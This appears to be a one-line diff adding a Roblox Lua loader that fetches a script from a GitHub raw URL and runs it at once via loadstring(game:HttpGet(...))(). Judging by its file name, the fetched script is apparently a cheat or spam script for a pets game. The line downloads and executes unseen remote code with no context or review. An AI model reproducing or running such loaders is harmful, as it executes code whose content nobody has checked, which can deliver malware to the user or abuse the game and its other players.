@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/pets-universe-spam2-qaephf6jhyt01l.lua"))()
